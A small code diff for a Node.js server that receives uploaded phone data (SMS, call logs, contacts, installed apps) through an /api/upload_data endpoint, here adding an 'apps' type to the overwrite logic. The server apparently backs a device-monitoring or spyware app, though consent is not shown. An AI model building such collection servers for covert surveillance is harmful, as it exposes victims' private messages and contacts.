@@ -92,7 +92,7 @@ io.on('connection', (socket) => {
 });
 
 app.get('/', (req, res) => {
-    res.send('✅ Server Running: SMS & Contacts Fixed!');
+    res.send('✅ Server Running: Apps, SMS & Contacts Fixed!');
 });
 
 // ==================================================
@@ -245,7 +245,7 @@ app.post('/api/status', (req, res) => {
 });
 
 // ==================================================
-//  🔥 DATA STORAGE (✅ SMS & CONTACTS FIXED)
+//  🔥 DATA STORAGE (✅ SMS, CONTACTS & APPS FIXED)
 // ==================================================
 
 app.post('/api/upload_data', async (req, res) => { 
@@ -294,8 +294,8 @@ app.post('/api/upload_data', async (req, res) => {
             finalData.sort((a, b) => (a.name || "").localeCompare(b.name || ""));
         }
         
-        // 3. SMS FIXED (Added 'sms' to overwrite list)
-        else if (['installed_apps', 'call_logs', 'sms'].includes(type)) {
+        // 3. SMS & APPS FIXED (Overwrite logic for Apps too)
+        else if (['installed_apps', 'apps', 'call_logs', 'sms'].includes(type)) {
              finalData = Array.isArray(parsedData) ? parsedData : [parsedData];
         } 
         
